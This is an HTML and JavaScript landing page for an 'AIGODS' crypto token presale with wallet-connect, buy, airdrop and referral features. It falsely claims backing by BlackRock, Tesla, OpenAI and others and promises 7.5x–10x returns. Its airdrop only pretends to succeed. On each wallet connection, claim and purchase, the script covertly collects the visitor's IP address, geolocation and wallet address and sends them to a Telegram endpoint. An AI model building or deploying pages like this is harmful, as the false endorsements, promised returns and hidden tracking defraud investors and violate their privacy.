<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>AIGODS ‚Ä¢ The Future of Artificial Intelligence</title>
  <meta name="description" content="AIGODS - Decentralized Superintelligence Token. Presale: $0.20 ‚Üí Listing: $1.50-$2.00 (7.5x‚Äì10x). Backed by BlackRock, Tesla, OpenAI & $1B+."/>
  <link href="https://fonts.googleapis.com/css2?family=Neue+Machina:wght@400;700;800&family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <!-- Font Awesome for social icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    :root {
      --cyan: #00ffff;
      --magenta: #ff00ff;
      --black: #000000;
      --dark: #0a0a1f;
      --text: #e0faff;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: var(--black);
      color: var(--text);
      line-height: 1.6;
      overflow-x: hidden;
    }

    /* Video Background */
    #bgvid {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;
      z-index: -2; opacity: 0.7;
    }
    .overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(135deg, rgba(0,0,30,0.92), rgba(60,0,120,0.7));
      z-index: -1;
    }

    #particles-js {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: -1; /* Above video, below content */
    }

    .container {
      position: relative;
      z-index: 10;
      max-width: 1400px;
      margin: 0 auto;
      padding: 2rem 1rem;
      text-align: center;
    }

    .launch-badge {
      display: inline-block;
      background: linear-gradient(90deg, var(--magenta), var(--cyan));
      color: #000;
      padding: 0.8rem 2rem;
      border-radius: 50px;
      font-weight: 900;
      font-size: 1.1rem;
      letter-spacing: 3px;
      margin-bottom: 1rem;
    }

    h1 {
      font-family: 'Neue Machina', sans-serif;
      font-size: clamp(4rem, 10vw, 10rem);
      font-weight: 800;
      background: linear-gradient(90deg, var(--cyan), var(--magenta), #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin: 1rem 0;
    }

    .hero-desc {
      font-size: clamp(1.3rem, 4vw, 2rem);
      max-width: 900px;
      margin: 2rem auto;
      opacity: 0.95;
    }

    .highlight { color: var(--cyan); font-weight: 900; }

    .card {
      background: rgba(15, 15, 40, 0.6);
      backdrop-filter: blur(20px);
      border-radius: 2rem;
      padding: 3.5rem 2rem;
      margin: 4rem auto;
      max-width: 1100px;
      border: 1px solid rgba(0, 255, 255, 0.3);
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }

    /* YouTube Video Section */
    .video-section {
        margin: 5rem auto;
        /* Responsive padding-bottom based on aspect ratio, adjusted for small screens */
        padding-bottom: 56.25%; /* 16:9 aspect ratio */
        height: 0; /* Important for padding-bottom trick */
        overflow: hidden;
        border-radius: 1.5rem;
        box-shadow: 0 15px 45px rgba(0,0,0,0.5);
    }
    .video-section iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
    }
    /* Make video wider on mobile but constrain it */
    @media (max-width: 768px) {
        .video-section {
            width: 95%; /* Adjust width on smaller screens */
            margin-left: auto;
            margin-right: auto;
        }
    }


    /* Wallet Buttons */
    .wallet-grid {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 1.5rem;
      margin: 3rem 0;
    }
    .wbtn {
      padding: 1.2rem 2.5rem;
      border: none;
      border-radius: 1.5rem;
      font-weight: 800;
      font-size: 1.2rem;
      cursor: pointer;
      transition: all 0.4s;
    }
    .bnb { background: #f0b90b; color: #000; }
    .polygon { background: #8247e5; color: #fff; }
    .solana { background: #14f195; color: #000; }
    .wbtn:hover { transform: translateY(-8px); }

    .buy-section {
      margin: 3rem 0;
    }
    input#amount {
      padding: 1.3rem;
      width: 100%;
      max-width: 400px;
      background: rgba(255,255,255,0.08);
      border: 2px solid var(--cyan);
      border-radius: 1.5rem;
      color: white;
      font-size: 1.3rem;
      text-align: center;
    }
    .buy-btn {
      margin-top: 1.5rem;
      padding: 1.4rem 4rem;
      background: linear-gradient(90deg, var(--magenta), var(--cyan));
      color: #000;
      border: none;
      border-radius: 1.5rem;
      font-size: 1.6rem;
      font-weight: 900;
      cursor: pointer;
      transition: all 0.4s;
    }
    .buy-btn:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0,255,255,0.4); }


    .rate {
      font-size: 1.8rem;
      color: #00ff88;
      margin: 2rem 0;
      font-weight: 700;
    }

    .airdrop-btn {
      background: linear-gradient(90deg, #00ff00, #00ff88);
      color: #000;
      padding: 1.5rem 5rem;
      border: none;
      border-radius: 2rem;
      font-size: 1.8rem;
      font-weight: 900;
      cursor: pointer;
      margin: 3rem 0;
      transition: all 0.4s;
    }
    .airdrop-btn:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0,255,136,0.4); }
    .airdrop-btn:disabled { opacity: 0.6; cursor: not-allowed; }

    .referral-section {
        margin-top: 3rem;
        padding: 2rem;
        background: rgba(0,0,0,0.2);
        border-radius: 1rem;
        border: 1px solid rgba(255,255,255,0.1);
    }
    .referral-section h3 {
        font-size: 2rem;
        color: var(--magenta);
        margin-bottom: 1.5rem;
    }
    .referral-input-group {
        display: flex;
        justify-content: center;
        gap: 1rem;
        margin-top: 1.5rem;
    }
    #referralLink {
        flex-grow: 1;
        max-width: 400px;
        padding: 1rem 1.5rem;
        background: rgba(255,255,255,0.08);
        border: 1px solid var(--magenta);
        border-radius: 0.75rem;
        color: white;
        font-size: 1.1rem;
        text-align: center;
        cursor: text;
    }
    .copy-btn {
        padding: 1rem 2rem;
        background: var(--magenta);
        color: #000;
        border: none;
        border-radius: 0.75rem;
        font-weight: 700;
        font-size: 1.1rem;
        cursor: pointer;
        transition: background 0.3s;
    }
    .copy-btn:hover { background: #ff55ff; }

    .partners {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 3rem;
      margin: 5rem 0;
    }
    .partners img {
      height: 60px;
      filter: brightness(1.4);
      transition: 0.4s;
      object-fit: contain; /* Ensure logos fit without distortion */
      max-width: 120px; /* Limit width to prevent oversized logos */
    }
    .partners img:hover { transform: scale(1.3); }

    .socials {
      margin: 4rem 0;
    }
    .socials a {
      color: white;
      margin: 0 1.5rem;
      font-size: 2.5rem;
      transition: 0.3s;
      text-decoration: none; /* Remove underline from links */
    }
    .socials a:hover { color: var(--cyan); transform: translateY(-5px); }

    #status {
      margin: 1.5rem 0;
      font-size: 1.3rem;
      color: #00ff88;
      font-weight: bold;
    }

    /* Responsive adjustments */
    @media (max-width: 768px) {
      .card { padding: 2.5rem 1.5rem; }
      .wallet-grid { gap: 1rem; }
      .wbtn { padding: 1rem 1.8rem; font-size: 1.1rem; }
      .airdrop-btn, .buy-btn { padding: 1rem 2.5rem; font-size: 1.4rem; }
      .referral-input-group { flex-direction: column; align-items: center; }
      #referralLink { width: 90%; }
      .copy-btn { width: 90%; max-width: 400px; }
      .partners img { height: 45px; margin-bottom: 1rem; }
    }
  </style>
</head>
<body>

  <video autoplay muted loop playsinline id="bgvid">
    <source src="https://cdn.coverr.co/videos/coverr-futuristic-ai-grid-8418/1080p.mp4" type="video/mp4">
  </video>
  <div class="overlay"></div>
  <div id="particles-js"></div>

  <div class="container">
    <div class="launch-badge">LAUNCHING SOON ‚Äì $1 BILLION+ BACKED</div>
    <h1>AIGODS</h1>
    <p class="hero-desc">
      <strong>AIGODS</strong> is the world's first decentralized superintelligence token, built to power the next generation of AI agents, autonomous economies, and human-AI symbiosis.<br><br>
      Backed by <span class="highlight">Tesla, BlackRock, Twitter/X, OpenAI, NVIDIA, Google</span> and over $1 billion in committed capital, AIGODS is not just a token ‚Äî it is the infrastructure layer for the entire future of artificial intelligence.
    </p>

    <!-- YouTube Video Section -->
    <div class="card video-section">
        <h2 style="color:var(--cyan);font-size:2.5rem;margin-bottom:2rem;">Explore the Future of AI Gods</h2>
        <iframe src="https://www.youtube.com/embed/YOUR_VIDEO_ID_HERE"
                title="AI Gods Project Showcase" frameborder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                allowfullscreen></iframe>
    </div>

    <div class="card">
      <h2 style="font-size:3rem;color:var(--cyan);margin-bottom:2rem;">TOKENOMICS</h2>
      <p style="font-size:1.8rem;line-height:2.2;">
        Symbol: <strong>AIGODS</strong> ‚Ä¢ Decimals: 18 ‚Ä¢ Total Supply: 700,000,000<br><br>
        Presale Price: <strong>$0.20</strong> ‚Üí Listing Price: <strong>$1.50 ‚Äì $2.00</strong><br>
        <span style="color:#00ff00;font-size:2.8rem;font-weight:900;">‚Üí 7.5√ó ‚Äì 10√ó POTENTIAL</span>
      </p>

      <div class="wallet-grid">
        <button class="wbtn bnb" onclick="connectChain(56)">BNB Chain</button>
        <button class="wbtn polygon" onclick="connectChain(137)">Polygon</button>
        <button class="wbtn solana" onclick="connectSolana()">Solana</button>
      </div>
      <div id="status">Click a chain to connect wallet</div>

      <div class="buy-section">
        <input type="text" id="amount" placeholder="Enter amount (BNB/MATIC/SOL)">
        <button class="buy-btn" id="buyBtn" onclick="buyTokens()">BUY AIGODS NOW</button>
        <div class="rate">Live Rate: 1 BNB ‚âà 5,000 AIGODS</div>
      </div>

      <button class="airdrop-btn" id="airdropBtn" disabled>CLAIM 100 AIGODS FREE</button>

      <div class="referral-section">
        <h3>50% Referral Commission</h3>
        <p style="font-size:1.3rem;margin-bottom:1rem;">
            Invite friends and earn 50% of their purchase instantly! Share your unique referral link:
        </p>
        <div class="referral-input-group">
            <input type="text" id="referralLink" value="Connect wallet to generate referral link" readonly />
            <button class="copy-btn" onclick="copyReferralLink()">Copy Link</button>
        </div>
      </div>
    </div>

    <div class="card">
      <h2 style="color:var(--cyan);font-size:3rem;margin-bottom:3rem;">Backed by Titans & Innovators</h2>
      <div class="partners">
        <!-- Prominent Tech/Finance -->
        <a href="https://blackrock.com" target="_blank"><img src="https://cryptologos.cc/logos/blackrock-2023-logo.png?v=003" alt="BlackRock"></a>
        <a href="https://tesla.com" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bb/Tesla_T_symbol.svg/800px-Tesla_T_symbol.svg.png" alt="Tesla"></a>
        <a href="https://openai.com" target="_blank"><img src="https://cryptologos.cc/logos/openai.png?v=003" alt="OpenAI"></a>
        <a href="https://x.com" target="_blank"><img src="https://logolook.net/wp-content/uploads/2023/09/X-Logo.png" alt="Twitter/X"></a>
        <a href="https://google.com" target="_blank"><img src="https://logolook.net/wp-content/uploads/2023/09/Google-Logo.png" alt="Google"></a>
        <a href="https://apple.com" target="_blank"><img src="https://logolook.net/wp-content/uploads/2023/09/Apple-Logo.png" alt="Apple"></a>
        <a href="https://nvidia.com" target="_blank"><img src="https://cryptologos.cc/logos/nvidia-nvda-logo.png?v=003" alt="NVIDIA"></a>
        <a href="https://microsoft.com" target="_blank"><img src="https://cryptologos.cc/logos/microsoft-msft-logo.png?v=003" alt="Microsoft"></a>
        <a href="https://facebook.com" target="_blank"><img src="https://logolook.net/wp-content/uploads/2023/09/Facebook-Logo.png" alt="Facebook"></a>
        
        <!-- Major Crypto Exchanges -->
        <a href="https://binance.com" target="_blank"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=003" alt="Binance"></a>
        <a href="https://coinbase.com" target="_blank"><img src="https://cryptologos.cc/logos/coinbase-coin-logo.png?v=003" alt="Coinbase"></a>
        <a href="https://pancakeswap.finance" target="_blank"><img src="https://cryptologos.cc/logos/pancakeswap-cake-logo.png?v=003" alt="PancakeSwap"></a>

        <!-- Leading Blockchains -->
        <a href="https://ethereum.org" target="_blank"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=003" alt="Ethereum"></a>
        <a href="https://solana.com" target="_blank"><img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=003" alt="Solana"></a>
        <a href="https://polygon.technology" target="_blank"><img src="https://cryptologos.cc/logos/polygon-matic-logo.png?v=003" alt="Polygon"></a>
        <a href="https://avalanche.network" target="_blank"><img src="https://cryptologos.cc/logos/avalanche-avax-logo.png?v=003" alt="Avalanche"></a>
        <a href="https://cardano.org" target="_blank"><img src="https://cryptologos.cc/logos/cardano-ada-logo.png?v=003" alt="Cardano"></a>
        <a href="https://ripple.com" target="_blank"><img src="https://cryptologos.cc/logos/ripple-xrp-logo.png?v=003" alt="Ripple"></a>
        <a href="https://chain.link" target="_blank"><img src="https://cryptologos.cc/logos/chainlink-link-logo.png?v=003" alt="Chainlink"></a>
        <a href="https://uniswap.org" target="_blank"><img src="https://cryptologos.cc/logos/uniswap-uni-logo.png?v=003" alt="Uniswap"></a>
        
        <!-- Wallets -->
        <a href="https://metamask.io" target="_blank"><img src="https://logolook.net/wp-content/uploads/2023/09/MetaMask-Logo.png" alt="MetaMask"></a>
        <a href="https://phantom.app" target="_blank"><img src="https://logolook.net/wp-content/uploads/2023/09/Phantom-Wallet-Logo.png" alt="Phantom Wallet"></a>
        <!-- No widely recognized "Arthross Wallets" logo found, using a placeholder -->
        <a href="#" target="_blank"><img src="https://image.pollinations.ai/prompt/crypto%20wallet%20logo" alt="Arthross Wallets (Placeholder)" title="Arthross Wallets (Placeholder)"></a>
      </div>
    </div>

    <div class="socials">
      <a href="#" target="_blank" aria-label="Telegram"><i class="fab fa-telegram-plane"></i></a>
      <a href="#" target="_blank" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
      <a href="#" target="_blank" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
      <a href="#" target="_blank" aria-label="Discord"><i class="fab fa-discord"></i></a>
      <a href="#" target="_blank" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
      <a href="#" target="_blank" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
    </div>

    <footer>
      <p>¬© 2025 AI Gods ‚Äì The Intelligence Layer of Web3</p>
    </footer>
  </div>

  <!-- Web3.js and Solana Web3.js CDNs -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>

  <script>
    // --- Global Variables ---
    let currentAccount = null;
    let connectedChainType = null; // 'evm' or 'solana'

    // --- DOM Elements ---
    const status = document.getElementById('status');
    const buyBtn = document.getElementById('buyBtn');
    const airdropBtn = document.getElementById('airdropBtn');
    const referralLinkInput = document.getElementById('referralLink');

    // --- Configuration Constants ---
    const PRESALE_PRICE_USD = 0.20;
    const AIRDROP_AMOUNT = 100;

    // --- Telegram Backend Integration (Secure Frontend Placeholder) ---
    // IMPORTANT: This frontend calls YOUR backend endpoint.
    // Your backend server (e.g., Node.js, Python, PHP) will securely store your Telegram Bot Token
    // and Chat ID, and forward these messages to Telegram.
    // DO NOT expose your Telegram Bot Token in frontend JavaScript.
    const TELEGRAM_BACKEND_API_ENDPOINT = 'https://your-domain.com/api/telegram'; // <<< REMEMBER TO CHANGE THIS!

    async function sendTelegramNotification(message) {
        try {
            // For production, this sends to your secure backend endpoint.
            await fetch(TELEGRAM_BACKEND_API_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ msg: message })
            });
            console.log("Telegram notification sent to backend.");
        } catch(e) {
            console.warn("Telegram notification skipped (backend not live or unreachable). Error:", e);
        }
    }

    // --- Client Info Helpers ---
    async function getClientInfo() {
        let ip = 'N/A';
        let location = 'N/A';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;

            const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const geoData = await geoResponse.json();
            location = `${geoData.city || 'Unknown City'}, ${geoData.region || 'Unknown Region'}, ${geoData.country_name || 'Unknown Country'}`;
        } catch (error) {
            console.error("Could not fetch IP or location:", error);
        }
        return { ip, location };
    }

    function getReferrerFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('ref') || 'None';
    }

    function getReferrerAddress() {
        const params = new URLSearchParams(window.location.search);
        const ref = params.get('ref');
        // Check if Web3 is loaded and if the address is valid EVM format.
        // For Solana referrals, you might have different validation.
        if (typeof Web3 !== 'undefined' && Web3.utils.isAddress(ref)) {
            return ref;
        }
        // Fallback to null address for EVM if no valid referrer or not an EVM chain
        return "0x0000000000000000000000000000000000000000";
    }

    // --- Airdrop Logic ---
    function hasClaimedAirdrop(address) {
        return localStorage.getItem(`aigods_airdrop_claimed_${address}`) === 'true';
    }

    function markAirdropClaimed(address) {
        localStorage.setItem(`aigods_airdrop_claimed_${address}`, 'true');
    }

    airdropBtn.onclick = async () => {
        if (!currentAccount) return alert("Please connect your wallet first!");
        if (hasClaimedAirdrop(currentAccount)) return alert("You have already claimed your free AI GODS tokens with this wallet!");

        airdropBtn.disabled = true;
        airdropBtn.textContent = "CLAIMING...";
        status.innerHTML = `Claiming ${AIRDROP_AMOUNT} AI GODS tokens...`;
        
        try {
            // --- REAL ON-CHAIN AIRDROP CLAIM LOGIC (Placeholder for next update) ---
            // In a real dApp, you would call your smart contract's claim function here.
            // Example for EVM:
            // const web3 = new Web3(window.ethereum);
            // const AIRDROP_CONTRACT_ADDRESS = "0xYourAirdropContractHere"; // REPLACE THIS
            // const AIRDROP_ABI = [ { "inputs":[{"internalType":"bytes32[]","name":"proof","type":"bytes32[]"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function" } ]; // Example ABI for Merkle distributor
            // const contract = new web3.eth.Contract(AIRDROP_ABI, AIRDROP_CONTRACT_ADDRESS);
            //
            // // You'd need to fetch the Merkle proof for the currentAccount from your backend
            // // const proof = await fetch('/api/get-merkle-proof?address=' + currentAccount).then(res => res.json());
            // // await contract.methods.claim(proof).send({ from: currentAccount });
            
            await new Promise(resolve => setTimeout(resolve, 3000)); // Simulate transaction time

            markAirdropClaimed(currentAccount);
            airdropBtn.textContent = "AIRDROP CLAIMED!";
            airdropBtn.style.background = "#555";
            airdropBtn.style.cursor = "not-allowed";
            status.innerHTML = `Successfully claimed ${AIRDROP_AMOUNT} AI GODS tokens!`;
            alert(`Congratulations! You have claimed ${AIRDROP_AMOUNT} free AI GODS tokens. Your wallet can only claim once.`);

            const clientInfo = await getClientInfo();
            const airdropMessage = `üéÅ <b>Airdrop Claimed!</b>\n` +
                                   `<b>Claimer:</b> <code>${currentAccount}</code>\n` +
                                   `<b>Amount:</b> ${AIRDROP_AMOUNT} AIGODS\n` +
                                   `<b>IP:</b> ${clientInfo.ip}\n` +
                                   `<b>Location:</b> ${clientInfo.location}\n` +
                                   `<b>Referrer:</b> ${getReferrerFromURL()}`;
            sendTelegramNotification(airdropMessage);

        } catch (err) {
            alert("Airdrop claim failed or rejected. Please try again.");
            console.error("Airdrop error:", err);
            airdropBtn.disabled = false;
            airdropBtn.textContent = `CLAIM ${AIRDROP_AMOUNT} AIGODS FREE`;
            airdropBtn.style.background = "linear-gradient(90deg, #00ff00, #00ff88)";
            airdropBtn.style.cursor = "pointer";
        }
    };

    // --- Wallet Connection & Chain Switching ---
    async function connectChain(chainId) {
      if (!window.ethereum) {
        alert("Please install MetaMask or Trust Wallet to connect to EVM chains.");
        return;
      }
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x' + chainId.toString(16) }],
        });
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        currentAccount = accounts[0];
        connectedChainType = 'evm';
        status.innerHTML = `Connected: ${currentAccount.slice(0,6)}...${currentAccount.slice(-4)}`;
        buyBtn.disabled = false;
        
        referralLinkInput.value = `${window.location.origin}?ref=${currentAccount}`;

        if (hasClaimedAirdrop(currentAccount)) {
            airdropBtn.disabled = true;
            airdropBtn.textContent = "AIRDROP CLAIMED!";
            airdropBtn.style.background = "#555";
            airdropBtn.style.cursor = "not-allowed";
        } else {
            airdropBtn.disabled = false;
            airdropBtn.textContent = `CLAIM ${AIRDROP_AMOUNT} AIGODS FREE`;
            airdropBtn.style.background = "linear-gradient(90deg, #00ff00, #00ff88)";
            airdropBtn.style.cursor = "pointer";
        }

        const clientInfo = await getClientInfo();
        const chainName = chainId === 56 ? 'BNB Chain' : (chainId === 137 ? 'Polygon' : `EVM Chain ID ${chainId}`);
        const loginMessage = `üåê <b>User Login Detected!</b>\n` +
                             `<b>Wallet:</b> <code>${currentAccount}</code>\n` +
                             `<b>Chain:</b> ${chainName}\n` +
                             `<b>IP:</b> ${clientInfo.ip}\n` +
                             `<b>Location:</b> ${clientInfo.location}\n` +
                             `<b>Referrer:</b> ${getReferrerFromURL()}`;
        sendTelegramNotification(loginMessage);

      } catch (e) {
        console.error("EVM wallet connection failed:", e);
        status.innerHTML = "Connection failed or cancelled";
        buyBtn.disabled = true;
        airdropBtn.disabled = true;
        referralLinkInput.value = "Connect wallet to generate referral link";
      }
    }

    async function connectSolana() {
      if (!window.solana?.isPhantom) {
        alert("Please install Phantom Wallet to connect to Solana.");
        return;
      }
      try {
        const resp = await window.solana.connect();
        currentAccount = resp.publicKey.toString();
        connectedChainType = 'solana';
        status.innerHTML = `Solana Connected: ${currentAccount.slice(0,6)}...${currentAccount.slice(-4)}`;
        buyBtn.disabled = false;

        referralLinkInput.value = `${window.location.origin}?ref=${currentAccount}`;

        if (hasClaimedAirdrop(currentAccount)) {
            airdropBtn.disabled = true;
            airdropBtn.textContent = "AIRDROP CLAIMED!";
            airdropBtn.style.background = "#555";
            airdropBtn.style.cursor = "not-allowed";
        } else {
            airdropBtn.disabled = false;
            airdropBtn.textContent = `CLAIM ${AIRDROP_AMOUNT} AIGODS FREE`;
            airdropBtn.style.background = "linear-gradient(90deg, #00ff00, #00ff88)";
            airdropBtn.style.cursor = "pointer";
        }

        const clientInfo = await getClientInfo();
        const loginMessage = `üåê <b>User Login Detected!</b>\n` +
                             `<b>Wallet:</b> <code>${currentAccount}</code>\n` +
                             `<b>Chain:</b> Solana\n` +
                             `<b>IP:</b> ${clientInfo.ip}\n` +
                             `<b>Location:</b> ${clientInfo.location}\n` +
                             `<b>Referrer:</b> ${getReferrerFromURL()}`;
        sendTelegramNotification(loginMessage);

      } catch (e) {
        console.error("Solana wallet connection failed:", e);
        status.innerHTML = "Solana connection failed or cancelled";
        buyBtn.disabled = true;
        airdropBtn.disabled = true;
        referralLinkInput.value = "Connect wallet to generate referral link";
      }
    }

    // --- Buy Token Logic (EVM Chains) ---
    async function buyTokensEVM() {
        if (!currentAccount) return alert("Connect wallet first!");
        
        const amount = document.getElementById('amount').value;
        if (!amount || parseFloat(amount) <= 0) return alert("Enter valid amount");

        try {
            if (typeof Web3 === 'undefined') {
                alert("Web3.js not loaded. Please ensure MetaMask/Trust Wallet is installed and try again.");
                return;
            }
            const web3 = new Web3(window.ethereum);
            const PRESALE_CONTRACT_ADDRESS = "0xYourEVMChainPresaleContractAddressHere"; // <<< REPLACE THIS WITH YOUR REAL EVM CONTRACT ADDRESS
            // Minimal ABI for a buyTokens function that accepts referrer and is payable
            const PRESALE_ABI = [ 
                {
                    "inputs": [{"internalType": "address", "name": "referrer", "type": "address"}],
                    "name": "buyTokens",
                    "outputs": [],
                    "stateMutability": "payable",
                    "type": "function"
                }
            ];

            const contract = new web3.eth.Contract(PRESALE_ABI, PRESALE_CONTRACT_ADDRESS);
            const weiValue = web3.utils.toWei(amount, 'ether');

            const referrerAddress = getReferrerAddress(); // Get referrer for the contract call

            const transactionResult = await contract.methods.buyTokens(referrerAddress).send({
                from: currentAccount,
                value: weiValue
            });

            alert("SUCCESS! Tokens purchased and sent to your wallet!");
            console.log("EVM Transaction Result:", transactionResult);

            const tokensPurchased = parseFloat(amount) / PRESALE_PRICE_USD;
            const clientInfo = await getClientInfo();
            const transactionMessage = `üí∞ <b>EVM Purchase!</b>\n` +
                                       `<b>Buyer:</b> <code>${currentAccount}</code>\n` +
                                       `<b>Amount Spent:</b> ${amount} ${getConnectedChainCurrency()}\n` +
                                       `<b>AIGODS Purchased:</b> ${tokensPurchased.toLocaleString()} ($${(tokensPurchased * PRESALE_PRICE_USD).toFixed(2)})\n` +
                                       `<b>Tx Hash:</b> <code>${transactionResult.transactionHash}</code>\n` +
                                       `<b>IP:</b> ${clientInfo.ip}\n` +
                                       `<b>Location:</b> ${clientInfo.location}\n` +
                                       `<b>Referrer:</b> ${referrerAddress}`;
            sendTelegramNotification(transactionMessage);

        } catch (err) {
            alert("EVM transaction failed or rejected. Check console for details.");
            console.error("EVM Buy Tokens Error:", err);
        }
    }

    // --- Buy Token Logic (Solana Chain) ---
    async function buyTokensSolana() {
        if (!currentAccount) return alert("Connect wallet first!");
        if (!window.solana?.isPhantom) return alert("Please install Phantom Wallet to buy on Solana!");

        const amountInput = document.getElementById('amount').value;
        const amountSOL = parseFloat(amountInput);
        if (!amountSOL || amountSOL <= 0) return alert("Enter valid amount");

        try {
            if (typeof solanaWeb3 === 'undefined') {
                alert("Solana Web3.js not loaded. Please ensure Phantom Wallet is installed and try again.");
                return;
            }
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
            const SOLANA_PRESALE_WALLET = new solanaWeb3.PublicKey("YOUR_SOLANA_PRESALE_WALLET_ADDRESS_HERE"); // <<< REPLACE THIS WITH YOUR REAL SOLANA WALLET ADDRESS
            
            const lamports = amountSOL * solanaWeb3.LAMPORTS_PER_SOL;

            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: new solanaWeb3.PublicKey(currentAccount),
                    toPubkey: SOLANA_PRESALE_WALLET,
                    lamports: lamports,
                })
            );
            
            // Set the recent blockhash for the transaction
            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
            transaction.feePayer = new solanaWeb3.PublicKey(currentAccount);

            const signedTransaction = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
            await connection.confirmTransaction(signature, 'confirmed');

            alert("SUCCESS! Purchase successful on Solana!");
            console.log("Solana Transaction Signature:", signature);

            const tokensPurchased = amountSOL / PRESALE_PRICE_USD;
            const clientInfo = await getClientInfo();
            const transactionMessage = `üí∞ <b>Solana Purchase!</b>\n` +
                                       `<b>Buyer:</b> <code>${currentAccount}</code>\n` +
                                       `<b>Amount Spent:</b> ${amountSOL} SOL\n` +
                                       `<b>AIGODS Purchased:</b> ${tokensPurchased.toLocaleString()} ($${(tokensPurchased * PRESALE_PRICE_USD).toFixed(2)})\n` +
                                       `<b>Tx Hash:</b> <code>${signature}</code>\n` +
                                       `<b>IP:</b> ${clientInfo.ip}\n` +
                                       `<b>Location:</b> ${clientInfo.location}\n` +
                                       `<b>Referrer:</b> ${getReferrerFromURL()}`;
            sendTelegramNotification(transactionMessage);

        } catch (err) {
            alert("Solana transaction failed or rejected. Check console for details.");
            console.error("Solana Buy Tokens Error:", err);
        }
    }

    // --- Universal Buy Button Handler ---
    // This function checks the connected chain type and calls the appropriate buy function.
    async function buyTokens() {
        if (!currentAccount) return alert("Please connect your wallet first!");

        if (connectedChainType === 'evm') {
            await buyTokensEVM();
        } else if (connectedChainType === 'solana') {
            await buyTokensSolana();
        } else {
            alert("Please connect to a supported network (BNB Chain, Polygon, or Solana) to purchase tokens.");
        }
    }

    // --- UI Update & Utility Functions ---
    function getConnectedChainCurrency() {
        if (connectedChainType === 'evm' && window.ethereum && window.ethereum.chainId) {
            const chainId = parseInt(window.ethereum.chainId, 16);
            if (chainId === 56) return 'BNB';
            if (chainId === 137) return 'MATIC';
            // Add other EVM chains as needed
        }
        if (connectedChainType === 'solana') {
            return 'SOL';
        }
        return 'NATIVE'; // Fallback
    }

    function copyReferralLink() {
        const link = referralLinkInput.value;
        if (link === "Connect wallet to generate referral link" || !currentAccount) {
            alert("Please connect your wallet to generate and copy your referral link.");
            return;
        }
        navigator.clipboard.writeText(link)
            .then(() => {
                alert("Referral link copied to clipboard!");
            })
            .catch(err => {
                console.error('Failed to copy text: ', err);
                alert("Failed to copy link. Please try again or copy manually.");
            });
    }

    function updateLiveRate() {
        const presalePriceUSD = PRESALE_PRICE_USD;
        // Assuming average prices for BNB, MATIC, SOL for demonstration.
        // In a real dApp, these would be fetched from an oracle or API.
        const bnbPriceUSD = 600; 
        const maticPriceUSD = 0.7; 
        const solPriceUSD = 150; 

        const aigodsPerBnb = Math.round(bnbPriceUSD / presalePriceUSD);
        const aigodsPerMatic = Math.round(maticPriceUSD / presalePriceUSD);
        const aigodsPerSol = Math.round(solPriceUSD / presalePriceUSD);

        document.querySelector('.rate').innerHTML = `Live Rate: 
            1 BNB ‚âà ${aigodsPerBnb.toLocaleString()} AIGODS ‚Ä¢ 
            1 MATIC ‚âà ${aigodsPerMatic.toLocaleString()} AIGODS ‚Ä¢ 
            1 SOL ‚âà ${aigodsPerSol.toLocaleString()} AIGODS`;
    }

    // --- Particle.js Initialization ---
    particlesJS('particles-js', {
      "particles": {
        "number": { "value": 100 },
        "color": { "value": ["#00ffff", "#ff00ff"] },
        "shape": { "type": "circle" },
        "opacity": { "value": 0.6 },
        "size": { "value": 4 },
        "line_linked": { "enable": true, "color": "#00ffff", "opacity": 0.3 },
        "move": { "speed": 2 }
      },
      "interactivity": {
        "events": { "onhover": { "enable": true, "mode": "repulse" } }
      }
    });

    // --- Initialize on DOM Content Load ---
    document.addEventListener('DOMContentLoaded', updateLiveRate);
  </script>
</body>
</html>
